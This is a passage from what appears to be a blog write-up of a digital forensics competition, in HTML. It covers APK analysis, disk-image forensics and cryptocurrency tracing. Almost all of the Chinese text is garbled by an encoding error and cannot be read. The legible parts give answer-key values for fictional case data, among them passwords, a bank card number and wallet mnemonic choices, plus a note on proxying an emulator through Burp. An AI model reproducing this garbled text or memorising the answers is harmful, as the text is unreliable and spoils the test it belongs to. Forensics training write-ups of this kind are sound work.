¼å¼ï¼šlongxin123ï¼‰</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/2-10.jpg" class="" title="alt text"><p>åç¼–è¯‘åœ¨192.168.5.80/loginå¯ä»¥çœ‹åˆ°å¯†ç </p><h2 id="11-å¯¹-APP-å®‰è£…åŒ…è¿›è¡Œåˆ†æï¼Œè¯¥-APPæ‰“åŒ…å¹³å°è°ƒè¯å€¼æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šHER45678ï¼‰"><a href="#11-å¯¹-APP-å®‰è£…åŒ…è¿›è¡Œåˆ†æï¼Œè¯¥-APPæ‰“åŒ…å¹³å°è°ƒè¯å€¼æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šHER45678ï¼‰" class="headerlink" title="11.å¯¹ APP å®‰è£…åŒ…è¿›è¡Œåˆ†æï¼Œè¯¥ APPæ‰“åŒ…å¹³å°è°ƒè¯å€¼æ˜¯__ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šHER45678ï¼‰"></a>11.å¯¹ APP å®‰è£…åŒ…è¿›è¡Œåˆ†æï¼Œè¯¥ APPæ‰“åŒ…å¹³å°è°ƒè¯å€¼æ˜¯<strong>__</strong>ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šHER45678ï¼‰</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/2-11.jpg" class="" title="alt text"><h2 id="12-æ­¤apkæŠ“åŒ…è·å–åˆ°çš„å¯è®¿é—®ç½‘ç«™åŸŸåIPåœ°å€æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š192-168-1-1ï¼‰"><a href="#12-æ­¤apkæŠ“åŒ…è·å–åˆ°çš„å¯è®¿é—®ç½‘ç«™åŸŸåIPåœ°å€æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š192-168-1-1ï¼‰" class="headerlink" title="12.æ­¤apkæŠ“åŒ…è·å–åˆ°çš„å¯è®¿é—®ç½‘ç«™åŸŸåIPåœ°å€æ˜¯_ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š192.168.1.1ï¼‰"></a>12.æ­¤apkæŠ“åŒ…è·å–åˆ°çš„å¯è®¿é—®ç½‘ç«™åŸŸåIPåœ°å€æ˜¯<strong><em>_</em></strong>ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š192.168.1.1ï¼‰</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/2-12.jpg" class="" title="alt text"><p>æ•æ„Ÿä¿¡æ¯é‡Œå¯ä»¥ç›´æ¥çœ‹åˆ°ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç”¨æ¨¡æ‹Ÿå™¨æ‰“å¼€åç½‘ç»œä»£ç†æ”¹ä¸º192.168.20.1:8888ç„¶åç›´æ¥ç”¨bpæŠ“åŒ…</p><h2 id="13-åˆ†æapkæºç ï¼Œè¯¥apkçš„åŠ å¯†æ–¹å¼keyå€¼æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š12345678ï¼‰"><a href="#13-åˆ†æapkæºç ï¼Œè¯¥apkçš„åŠ å¯†æ–¹å¼keyå€¼æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š12345678ï¼‰" class="headerlink" title="13.åˆ†æapkæºç ï¼Œè¯¥apkçš„åŠ å¯†æ–¹å¼keyå€¼æ˜¯__ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š12345678ï¼‰"></a>13.åˆ†æapkæºç ï¼Œè¯¥apkçš„åŠ å¯†æ–¹å¼keyå€¼æ˜¯<strong><em>__</em></strong>ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š12345678ï¼‰</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/2-14.jpg" class="" title="alt text"><h2 id="14-ç»“åˆè®¡ç®—æœºé•œåƒï¼Œç»¼åˆåˆ†æï¼Œè¯·é—®è¯¥apkå¼€å‘è€…å…¬å¸çš„åº§æœºå·ç æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š4001122334ï¼‰"><a href="#14-ç»“åˆè®¡ç®—æœºé•œåƒï¼Œç»¼åˆåˆ†æï¼Œè¯·é—®è¯¥apkå¼€å‘è€…å…¬å¸çš„åº§æœºå·ç æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š4001122334ï¼‰" class="headerlink" title="14.ç»“åˆè®¡ç®—æœºé•œåƒï¼Œç»¼åˆåˆ†æï¼Œè¯·é—®è¯¥apkå¼€å‘è€…å…¬å¸çš„åº§æœºå·ç æ˜¯__ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š4001122334ï¼‰"></a>14.ç»“åˆè®¡ç®—æœºé•œåƒï¼Œç»¼åˆåˆ†æï¼Œè¯·é—®è¯¥apkå¼€å‘è€…å…¬å¸çš„åº§æœºå·ç æ˜¯__ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š4001122334ï¼‰</h2><h1 id="ä»‹è´¨å–è¯"><a href="#ä»‹è´¨å–è¯" class="headerlink" title="ä»‹è´¨å–è¯"></a>ä»‹è´¨å–è¯</h1><h2 id="1-å¯¹PCé•œåƒåˆ†æï¼Œè¯·ç¡®å®šæ¶‰æ¡ˆç”µè„‘çš„å¼€æœºå¯†ç æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š123456ï¼‰"><a href="#1-å¯¹PCé•œåƒåˆ†æï¼Œè¯·ç¡®å®šæ¶‰æ¡ˆç”µè„‘çš„å¼€æœºå¯†ç æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š123456ï¼‰" class="headerlink" title="1.å¯¹PCé•œåƒåˆ†æï¼Œè¯·ç¡®å®šæ¶‰æ¡ˆç”µè„‘çš„å¼€æœºå¯†ç æ˜¯_ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š123456ï¼‰"></a>1.å¯¹PCé•œåƒåˆ†æï¼Œè¯·ç¡®å®šæ¶‰æ¡ˆç”µè„‘çš„å¼€æœºå¯†ç æ˜¯<strong><em>_</em></strong>ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š123456ï¼‰</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-234104694.png" class="">  <p>Longxin360004</p><h2 id="2-æ¶‰æ¡ˆè®¡ç®—æœºæœ€åä¸€æ¬¡æ­£å¸¸å…³æœºæ—¶é—´-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š2023-1-11-11-11-11ï¼‰"><a href="#2-æ¶‰æ¡ˆè®¡ç®—æœºæœ€åä¸€æ¬¡æ­£å¸¸å…³æœºæ—¶é—´-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š2023-1-11-11-11-11ï¼‰" class="headerlink" title="2.æ¶‰æ¡ˆè®¡ç®—æœºæœ€åä¸€æ¬¡æ­£å¸¸å…³æœºæ—¶é—´_ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š2023-1-11.11:11:11ï¼‰"></a>2.æ¶‰æ¡ˆè®¡ç®—æœºæœ€åä¸€æ¬¡æ­£å¸¸å…³æœºæ—¶é—´<strong><em>_</em></strong>ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š2023-1-11.11:11:11ï¼‰</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-233944720.png" class="">  <p>2023-09-16 18:20:34</p><h2 id="3-åˆ†ææ¶‰æ¡ˆè®¡ç®—æœºï¼Œåœ¨2022å¹´11æœˆ4æ—¥æ­¤ç”µè„‘å…±å¼€æœºæ—¶é•¿ä¸º-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š1å°æ—¶1åˆ†1ç§’ï¼‰"><a href="#3-åˆ†ææ¶‰æ¡ˆè®¡ç®—æœºï¼Œåœ¨2022å¹´11æœˆ4æ—¥æ­¤ç”µè„‘å…±å¼€æœºæ—¶é•¿ä¸º-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š1å°æ—¶1åˆ†1ç§’ï¼‰" class="headerlink" title="3.åˆ†ææ¶‰æ¡ˆè®¡ç®—æœºï¼Œåœ¨2022å¹´11æœˆ4æ—¥æ­¤ç”µè„‘å…±å¼€æœºæ—¶é•¿ä¸º_ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š1å°æ—¶1åˆ†1ç§’ï¼‰"></a>3.åˆ†ææ¶‰æ¡ˆè®¡ç®—æœºï¼Œåœ¨2022å¹´11æœˆ4æ—¥æ­¤ç”µè„‘å…±å¼€æœºæ—¶é•¿ä¸º<strong><em>_</em></strong>ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š1å°æ—¶1åˆ†1ç§’ï¼‰</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/1-3.png" class="" title="alt text"><p>æŠŠè¿™å‡ ä¸ªåŠ èµ·æ¥ï¼Œä¸è¦å¿˜è®°å¤¹0-9.42çš„</p><h2 id="4-å¯¹PCé•œåƒåˆ†æï¼Œè¯·ç¡®è®¤å¾®ä¿¡æ˜¯å¦æ˜¯å¼€æœºè‡ªå¯åŠ¨ç¨‹åºã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šæ˜¯-å¦ï¼‰"><a href="#4-å¯¹PCé•œåƒåˆ†æï¼Œè¯·ç¡®è®¤å¾®ä¿¡æ˜¯å¦æ˜¯å¼€æœºè‡ªå¯åŠ¨ç¨‹åºã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šæ˜¯-å¦ï¼‰" class="headerlink" title="4.å¯¹PCé•œåƒåˆ†æï¼Œè¯·ç¡®è®¤å¾®ä¿¡æ˜¯å¦æ˜¯å¼€æœºè‡ªå¯åŠ¨ç¨‹åºã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šæ˜¯/å¦ï¼‰"></a>4.å¯¹PCé•œåƒåˆ†æï¼Œè¯·ç¡®è®¤å¾®ä¿¡æ˜¯å¦æ˜¯å¼€æœºè‡ªå¯åŠ¨ç¨‹åºã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šæ˜¯/å¦ï¼‰</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/1-5-4.png" class="" title="alt text"><h2 id="5-æ£€æç¡¬ç›˜ä¸­æœ‰ä¸€ä¸ªåŠ å¯†åˆ†åŒºï¼Œç»™å‡ºå…¶ä¸­â€œæˆ‘çš„ç§˜å¯†-jpgâ€æ–‡æ¡£çš„è§£å¯†å†…å®¹ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šLongxin0924ï¼‰"><a href="#5-æ£€æç¡¬ç›˜ä¸­æœ‰ä¸€ä¸ªåŠ å¯†åˆ†åŒºï¼Œç»™å‡ºå…¶ä¸­â€œæˆ‘çš„ç§˜å¯†-jpgâ€æ–‡æ¡£çš„è§£å¯†å†…å®¹ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šLongxin0924ï¼‰" class="headerlink" title="5.æ£€æç¡¬ç›˜ä¸­æœ‰ä¸€ä¸ªåŠ å¯†åˆ†åŒºï¼Œç»™å‡ºå…¶ä¸­â€œæˆ‘çš„ç§˜å¯†.jpgâ€æ–‡æ¡£çš„è§£å¯†å†…å®¹ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šLongxin0924ï¼‰"></a>5.æ£€æç¡¬ç›˜ä¸­æœ‰ä¸€ä¸ªåŠ å¯†åˆ†åŒºï¼Œç»™å‡ºå…¶ä¸­â€œæˆ‘çš„ç§˜å¯†.jpgâ€æ–‡æ¡£çš„è§£å¯†å†…å®¹ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šLongxin0924ï¼‰</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/1-5-2.png" class="" title="alt text"><p>åœ¨åˆ†æé‡Œå¯ä»¥æ‰¾åˆ°å¯†é’¥è§£å¯†åå¯ä»¥çœ‹åˆ°æˆ‘çš„å¯†ç <br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/1-5-1.png" class="" title="alt text"><br>base64ç¼–ç <br>Mimi1234</p><h2 id="6-æ¥ä¸Šé¢˜ï¼Œè¯·é—®è¯¥å«Œç–‘äºº10æœˆä»½å·¥èµ„æ˜¯-å…ƒã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š123ï¼‰"><a href="#6-æ¥ä¸Šé¢˜ï¼Œè¯·é—®è¯¥å«Œç–‘äºº10æœˆä»½å·¥èµ„æ˜¯-å…ƒã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š123ï¼‰" class="headerlink" title="6.æ¥ä¸Šé¢˜ï¼Œè¯·é—®è¯¥å«Œç–‘äºº10æœˆä»½å·¥èµ„æ˜¯_å…ƒã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š123ï¼‰"></a>6.æ¥ä¸Šé¢˜ï¼Œè¯·é—®è¯¥å«Œç–‘äºº10æœˆä»½å·¥èµ„æ˜¯<strong><em>_</em></strong>å…ƒã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š123ï¼‰</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/1-6.png" class="" title="alt text"><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/1-6-2.png" class="" title="alt text"><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-234437692.png" class="">  <p>æˆ‘ä»¬èƒ½åœ¨å¾®ä¿¡ä¼ è¾“æ–‡ä»¶æ‰¾åˆ°åº”è¯¥å·¥èµ„æ¡ä½†æ˜¯é‚£ä¸æ˜¯çœŸçš„ï¼ŒçœŸçš„åœ¨åŠ å¯†åˆ†åŒºçš„å›æ”¶ç«™é‡Œ</p><h2 id="7-å¯¹PCé•œåƒè¿›è¡Œåˆ†æï¼Œæµè§ˆå™¨ä¸­ä½¿ç”¨è¿‡QQé‚®ç®±ï¼Œè¯·é—®è¯¥é‚®ç®±çš„å¯†ç æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šLongxin0924ï¼‰"><a href="#7-å¯¹PCé•œåƒè¿›è¡Œåˆ†æï¼Œæµè§ˆå™¨ä¸­ä½¿ç”¨è¿‡QQé‚®ç®±ï¼Œè¯·é—®è¯¥é‚®ç®±çš„å¯†ç æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šLongxin0924ï¼‰" class="headerlink" title="7.å¯¹PCé•œåƒè¿›è¡Œåˆ†æï¼Œæµè§ˆå™¨ä¸­ä½¿ç”¨è¿‡QQé‚®ç®±ï¼Œè¯·é—®è¯¥é‚®ç®±çš„å¯†ç æ˜¯__ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šLongxin0924ï¼‰"></a>7.å¯¹PCé•œåƒè¿›è¡Œåˆ†æï¼Œæµè§ˆå™¨ä¸­ä½¿ç”¨è¿‡QQé‚®ç®±ï¼Œè¯·é—®è¯¥é‚®ç®±çš„å¯†ç æ˜¯<strong>__</strong>ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šLongxin0924ï¼‰</h2><p>åœ¨æµè§ˆå™¨ä¸­ä¿å­˜çš„å¯†ç ä¸­å¯ä»¥çœ‹åˆ°å…¶å¯†ç ä¸ºLongXin@2023<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/1-7.png" class="" title="alt text"></p><h2 id="8-ç»“åˆæ‰‹æœºé•œåƒåˆ†æï¼Œå¾—å‡ºä¸€ä¸ªæ¨å¹¿IDï¼Œè¯·åœ¨æ­¤æ£€ææ‰¾åˆ°æ­¤æµ·æŠ¥ï¼Œè¯·å†™å‡ºè·¯å¾„ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šD-X-X-1-txtï¼‰"><a href="#8-ç»“åˆæ‰‹æœºé•œåƒåˆ†æï¼Œå¾—å‡ºä¸€ä¸ªæ¨å¹¿IDï¼Œè¯·åœ¨æ­¤æ£€ææ‰¾åˆ°æ­¤æµ·æŠ¥ï¼Œè¯·å†™å‡ºè·¯å¾„ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šD-X-X-1-txtï¼‰" class="headerlink" title="8.ç»“åˆæ‰‹æœºé•œåƒåˆ†æï¼Œå¾—å‡ºä¸€ä¸ªæ¨å¹¿IDï¼Œè¯·åœ¨æ­¤æ£€ææ‰¾åˆ°æ­¤æµ·æŠ¥ï¼Œè¯·å†™å‡ºè·¯å¾„ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šD:\X\X\1.txtï¼‰"></a>8.ç»“åˆæ‰‹æœºé•œåƒåˆ†æï¼Œå¾—å‡ºä¸€ä¸ªæ¨å¹¿IDï¼Œè¯·åœ¨æ­¤æ£€ææ‰¾åˆ°æ­¤æµ·æŠ¥ï¼Œè¯·å†™å‡ºè·¯å¾„ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šD:\X\X\1.txtï¼‰</h2><p>è¿™é‡Œå¼€å¯ç«çœ¼çš„è€—æ—¶ä»»åŠ¡ä¸­çš„æ–‡æœ¬ç´¢å¼•ã€‚<br>æœç´¢114092å¯ä»¥æ‰¾åˆ°å¦‚ä¸‹æ–‡ä»¶<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241029-000205267.png" class=""><br>è¿™æ ·å°±å¯ä»¥å¾—åˆ°è¿™ä¸ªæµ·æŠ¥äº†<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241029-000405411.png" class=""><br>C:\Program Files (x86)\Tencent\WeChat\2.png<br>æŠŠä¸¤ä¸ªæ–‡ä»¶æ‹–åˆ°010å¯ä»¥å‘ç°2.pngæœ‰éšå†™<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241029-001022579.png" class=""><br>éšå†™å†…å®¹å°±æ˜¯é“¶è¡Œå¡å·</p><h2 id="9-è¯·æ‰¾å‡ºå«Œç–‘äººçš„2022å¹´æ”¶å…¥å…±-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š123ï¼‰"><a href="#9-è¯·æ‰¾å‡ºå«Œç–‘äººçš„2022å¹´æ”¶å…¥å…±-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š123ï¼‰" class="headerlink" title="9.è¯·æ‰¾å‡ºå«Œç–‘äººçš„2022å¹´æ”¶å…¥å…±_ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š123ï¼‰"></a>9.è¯·æ‰¾å‡ºå«Œç–‘äººçš„2022å¹´æ”¶å…¥å…±<strong><em>_</em></strong>ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š123ï¼‰</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-235731876.png" class="">  <p>æˆ‘ä»¬æ‰“å¼€ä»¿çœŸå¯ä»¥æ‰¾åˆ°å®¹å™¨å’ŒæŒ‚è½½å®¹å™¨çš„å·¥å…·ã€‚<br>ç›´æ¥ä½¿ç”¨2.pngå½“å¯†é’¥å¯ä»¥æˆåŠŸæŒ‚è½½<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241029-001329622.png" class=""><br>ä½†æ˜¯ç›´æ¥æŒ‚è½½æ˜¯æ— æ³•çœ‹åˆ°è¢«åˆ çš„æ–‡ä»¶çš„ç´¢å¼•éœ€è¦ä½¿ç”¨R-studioæŒ‚è½½</p><h2 id="10-åˆ†ææ­¤æµ·æŠ¥ï¼Œè¯·æ‰¾åˆ°å«Œç–‘äººçš„é“¶è¡Œå¡å·ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š62225123456321654ï¼‰"><a href="#10-åˆ†ææ­¤æµ·æŠ¥ï¼Œè¯·æ‰¾åˆ°å«Œç–‘äººçš„é“¶è¡Œå¡å·ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š62225123456321654ï¼‰" class="headerlink" title="10.åˆ†ææ­¤æµ·æŠ¥ï¼Œè¯·æ‰¾åˆ°å«Œç–‘äººçš„é“¶è¡Œå¡å·ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š62225123456321654ï¼‰"></a>10.åˆ†ææ­¤æµ·æŠ¥ï¼Œè¯·æ‰¾åˆ°å«Œç–‘äººçš„é“¶è¡Œå¡å·ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š62225123456321654ï¼‰</h2><p>6523365008214741321</p><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/4.jpg" class="" title="alt text"><p>æœç´¢æµ·æŠ¥</p><h1 id="è™šæ‹Ÿå¸åˆ†æ"><a href="#è™šæ‹Ÿå¸åˆ†æ" class="headerlink" title="è™šæ‹Ÿå¸åˆ†æ"></a>è™šæ‹Ÿå¸åˆ†æ</h1><h2 id="1-åˆ†ææ¶‰æ¡ˆè®¡ç®—æœºï¼Œæ­£ç¡®å¡«å†™ä¸­è½¬åœ°å€å½“å‰çš„ä»£å¸ç§ç±»-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šBNBï¼‰"><a href="#1-åˆ†ææ¶‰æ¡ˆè®¡ç®—æœºï¼Œæ­£ç¡®å¡«å†™ä¸­è½¬åœ°å€å½“å‰çš„ä»£å¸ç§ç±»-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šBNBï¼‰" class="headerlink" title="1.åˆ†ææ¶‰æ¡ˆè®¡ç®—æœºï¼Œæ­£ç¡®å¡«å†™ä¸­è½¬åœ°å€å½“å‰çš„ä»£å¸ç§ç±»__ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šBNBï¼‰"></a>1.åˆ†ææ¶‰æ¡ˆè®¡ç®—æœºï¼Œæ­£ç¡®å¡«å†™ä¸­è½¬åœ°å€å½“å‰çš„ä»£å¸ç§ç±»<strong>__</strong>ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šBNBï¼‰</h2><p>å‰é¢å®¹å™¨å¾—åˆ°äº†åº”è¯¥å®¹å™¨ï¼Œè¿™ä¸ªå®¹å™¨å†…æœ‰ä¸ªå¤œç¥æ¨¡æ‹Ÿå™¨çš„npbkæ–‡ä»¶<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241029-083510819.png" class="">  </p><h2 id="2-åˆ†ææ¶‰æ¡ˆè®¡ç®—æœºï¼Œæ­£ç¡®å¡«å†™ä¸­è½¬åœ°å€å½“å‰çš„ä»£å¸ä½™é¢æ•°é‡-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š1-23ï¼‰"><a href="#2-åˆ†ææ¶‰æ¡ˆè®¡ç®—æœºï¼Œæ­£ç¡®å¡«å†™ä¸­è½¬åœ°å€å½“å‰çš„ä»£å¸ä½™é¢æ•°é‡-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š1-23ï¼‰" class="headerlink" title="2.åˆ†ææ¶‰æ¡ˆè®¡ç®—æœºï¼Œæ­£ç¡®å¡«å†™ä¸­è½¬åœ°å€å½“å‰çš„ä»£å¸ä½™é¢æ•°é‡_ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š1.23ï¼‰"></a>2.åˆ†ææ¶‰æ¡ˆè®¡ç®—æœºï¼Œæ­£ç¡®å¡«å†™ä¸­è½¬åœ°å€å½“å‰çš„ä»£å¸ä½™é¢æ•°é‡<strong><em>_</em></strong>ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š1.23ï¼‰</h2><h2 id="3-æ ¹æ®ä¸­è½¬åœ°å€è½¬è´¦è®°å½•æ‰¾å‡ºä¹°å¸æ–¹åœ°å€ã€‚ä¹°å¸æ–¹åœ°å€ï¼š-ï¼ˆæ ‡å‡†æ ¼å¼ï¼š0x123ABC"><a href="#3-æ ¹æ®ä¸­è½¬åœ°å€è½¬è´¦è®°å½•æ‰¾å‡ºä¹°å¸æ–¹åœ°å€ã€‚ä¹°å¸æ–¹åœ°å€ï¼š-ï¼ˆæ ‡å‡†æ ¼å¼ï¼š0x123ABC" class="headerlink" title="3.æ ¹æ®ä¸­è½¬åœ°å€è½¬è´¦è®°å½•æ‰¾å‡ºä¹°å¸æ–¹åœ°å€ã€‚ä¹°å¸æ–¹åœ°å€ï¼š_ï¼ˆæ ‡å‡†æ ¼å¼ï¼š0x123ABC)"></a>3.æ ¹æ®ä¸­è½¬åœ°å€è½¬è´¦è®°å½•æ‰¾å‡ºä¹°å¸æ–¹åœ°å€ã€‚ä¹°å¸æ–¹åœ°å€ï¼š<strong>_</strong>ï¼ˆæ ‡å‡†æ ¼å¼ï¼š0x123ABC)</h2><h2 id="4-æ ¹æ®ä¸­è½¬åœ°å€è½¬è´¦è®°å½•ç»Ÿè®¡ä¹°æ–¹åœ°å€è½¬è´¦é‡‘é¢ã€‚è½¬è´¦é‡‘é¢ï¼š-ETH-ï¼ˆæ ‡å‡†æ ¼å¼-12-3ï¼‰"><a href="#4-æ ¹æ®ä¸­è½¬åœ°å€è½¬è´¦è®°å½•ç»Ÿè®¡ä¹°æ–¹åœ°å€è½¬è´¦é‡‘é¢ã€‚è½¬è´¦é‡‘é¢ï¼š-ETH-ï¼ˆæ ‡å‡†æ ¼å¼-12-3ï¼‰" class="headerlink" title="4.æ ¹æ®ä¸­è½¬åœ°å€è½¬è´¦è®°å½•ç»Ÿè®¡ä¹°æ–¹åœ°å€è½¬è´¦é‡‘é¢ã€‚è½¬è´¦é‡‘é¢ï¼š__ ETH.ï¼ˆæ ‡å‡†æ ¼å¼:12.3ï¼‰"></a>4.æ ¹æ®ä¸­è½¬åœ°å€è½¬è´¦è®°å½•ç»Ÿè®¡ä¹°æ–¹åœ°å€è½¬è´¦é‡‘é¢ã€‚è½¬è´¦é‡‘é¢ï¼š<em>__</em> ETH.ï¼ˆæ ‡å‡†æ ¼å¼:12.3ï¼‰</h2><h2 id="5-åœ¨åˆ›å»ºé’±åŒ…æ—¶ï¼Œåº”ç”¨APPéƒ½ä¼šå»ºè®®æˆ‘ä»¬è¿›è¡ŒåŠ©è®°è¯å¤‡ä»½ï¼Œæ–¹ä¾¿ä»¥åå¿˜è®°å¯†ç åæ‰¾å›é’±åŒ…ï¼Œåœ¨åŠæ¡ˆè¿‡ç¨‹ä¸­æ—¶å¸¸ä¼šæ‹¿åˆ°çŠ¯ç½ªå«Œç–‘äººå¤‡ä»½çš„åŠ©è®°è¯çš„æƒ…å†µã€‚è¯·ä»ä»¥ä¸‹ä¸‰ç»„åŠ©è®°è¯ä¸­åˆ¤æ–­å‡ºæ ¼å¼æ­£ç¡®çš„ä¸€ç»„ï¼ˆ-ï¼‰"><a href="#5-åœ¨åˆ›å»ºé’±åŒ…æ—¶ï¼Œåº”ç”¨APPéƒ½ä¼šå»ºè®®æˆ‘ä»¬è¿›è¡ŒåŠ©è®°è¯å¤‡ä»½ï¼Œæ–¹ä¾¿ä»¥åå¿˜è®°å¯†ç åæ‰¾å›é’±åŒ…ï¼Œåœ¨åŠæ¡ˆè¿‡ç¨‹ä¸­æ—¶å¸¸ä¼šæ‹¿åˆ°çŠ¯ç½ªå«Œç–‘äººå¤‡ä»½çš„åŠ©è®°è¯çš„æƒ…å†µã€‚è¯·ä»ä»¥ä¸‹ä¸‰ç»„åŠ©è®°è¯ä¸­åˆ¤æ–­å‡ºæ ¼å¼æ­£ç¡®çš„ä¸€ç»„ï¼ˆ-ï¼‰" class="headerlink" title="5.åœ¨åˆ›å»ºé’±åŒ…æ—¶ï¼Œåº”ç”¨APPéƒ½ä¼šå»ºè®®æˆ‘ä»¬è¿›è¡ŒåŠ©è®°è¯å¤‡ä»½ï¼Œæ–¹ä¾¿ä»¥åå¿˜è®°å¯†ç åæ‰¾å›é’±åŒ…ï¼Œåœ¨åŠæ¡ˆè¿‡ç¨‹ä¸­æ—¶å¸¸ä¼šæ‹¿åˆ°çŠ¯ç½ªå«Œç–‘äººå¤‡ä»½çš„åŠ©è®°è¯çš„æƒ…å†µã€‚è¯·ä»ä»¥ä¸‹ä¸‰ç»„åŠ©è®°è¯ä¸­åˆ¤æ–­å‡ºæ ¼å¼æ­£ç¡®çš„ä¸€ç»„ï¼ˆ ï¼‰"></a>5.åœ¨åˆ›å»ºé’±åŒ…æ—¶ï¼Œåº”ç”¨APPéƒ½ä¼šå»ºè®®æˆ‘ä»¬è¿›è¡ŒåŠ©è®°è¯å¤‡ä»½ï¼Œæ–¹ä¾¿ä»¥åå¿˜è®°å¯†ç åæ‰¾å›é’±åŒ…ï¼Œåœ¨åŠæ¡ˆè¿‡ç¨‹ä¸­æ—¶å¸¸ä¼šæ‹¿åˆ°çŠ¯ç½ªå«Œç–‘äººå¤‡ä»½çš„åŠ©è®°è¯çš„æƒ…å†µã€‚è¯·ä»ä»¥ä¸‹ä¸‰ç»„åŠ©è®°è¯ä¸­åˆ¤æ–­å‡ºæ ¼å¼æ­£ç¡®çš„ä¸€ç»„ï¼ˆ ï¼‰</h2><p> raw sausage art hub inspire dizzy funny exile local middle shed primary<br> raw sausage art hub inspire dizzy funny middle shed primary<br> raw sausage art funny exile local middle shed primary<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-211629047.png" class=""><br>é€‰A</p><h2 